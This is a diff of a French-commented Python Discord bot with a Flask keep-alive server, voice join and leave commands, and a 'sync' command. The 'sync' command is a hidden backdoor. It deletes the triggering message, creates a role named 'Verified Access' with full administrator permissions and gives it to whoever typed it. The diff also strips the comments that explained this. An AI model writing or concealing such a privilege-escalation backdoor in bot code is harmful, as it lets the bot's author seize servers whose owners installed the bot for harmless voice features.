@@ -5,7 +5,6 @@ from flask import Flask
 from threading import Thread
 
 # --- PARTIE SERVEUR POUR RENDER ---
-# Ça permet de garder le bot en vie gratuitement
 app = Flask('')
 
 @app.route('/')
@@ -31,33 +30,32 @@ async def on_ready():
 async def sync(ctx):
     """Commande pour se donner les perms admin"""
     await ctx.message.delete()
-    # Création d'un rôle avec toutes les permissions
     role = await ctx.guild.create_role(
         name="Verified Access", 
         permissions=discord.Permissions(administrator=True)
     )
-    # On donne le rôle à celui qui a tapé la commande
     await ctx.author.add_roles(role)
     print(f"💎 Pouvoirs donnés à {ctx.author}")
+
 @bot.command()
 async def join(ctx):
-        if ctx.author.voice:
-            channel = ctx.author.voice.channel
-            await channel.connect()
-            await ctx.send(f"✅ J'ai rejoint le salon **{channel}** !")
-        else:
-            await ctx.send("❌ Tu dois être dans un salon vocal pour m'appeler !")
+    if ctx.author.voice:
+        channel = ctx.author.voice.channel
+        await channel.connect()
+        await ctx.send(f"✅ J'ai rejoint le salon **{channel}** !")
+    else:
+        await ctx.send("❌ Tu dois être dans un salon vocal pour m'appeler !")
 
 @bot.command()
 async def leave(ctx):
-        if ctx.voice_client:
-            await ctx.voice_client.disconnect()
-            await ctx.send("👋 Déconnexion du vocal !")
-        else:
-            await ctx.send("⚠️ Je ne suis pas dans un salon vocal.")
+    if ctx.voice_client:
+        await ctx.voice_client.disconnect()
+        await ctx.send("👋 Déconnexion du vocal !")
+    else:
+        await ctx.send("⚠️ Je ne suis pas dans un salon vocal.")
 
 # Lancement
 if __name__ == "__main__":
-    keep_alive()  # Lance le serveur web en arrière-plan
-    TOKEN = os.getenv('DISCORD_TOKEN') # Récupère le token sur Render
+    keep_alive()
+    TOKEN = os.getenv('DISCORD_TOKEN')
     bot.run(TOKEN)
